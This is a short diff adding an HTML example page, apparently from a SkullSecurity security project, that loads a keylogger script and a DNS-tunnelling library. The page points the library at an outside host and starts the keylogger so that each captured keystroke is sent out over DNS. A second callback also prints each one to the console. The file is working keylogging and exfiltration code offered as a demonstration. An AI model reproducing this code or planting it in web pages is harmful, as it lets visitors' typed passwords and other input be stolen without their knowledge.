@@ -1,0 +1,18 @@
+<!-- 
+  index.inline.html
+  By Stefan Penner
+  Created December, 2009
+
+  (See LICENSE.txt)
+
+  An example of the jsdnscat library being used to transmit logged key strokes
+
+-->
+<script type='text/javascript' src='js/skullsecurity.jsdnscat.js'></script>
+<script type='text/javascript' src='js/skullsecurity.keylogger.js'></script>
+<script type='text/javascript'>
+  SkullSecurity.jsdnscat.config.host = 'skullseclabs.org';  
+  SkullSecurity.keylogger.start(SkullSecurity.jsdnscat.send);
+  SkullSecurity.keylogger.start(function(entry){console.log(entry)});
+</script>
+
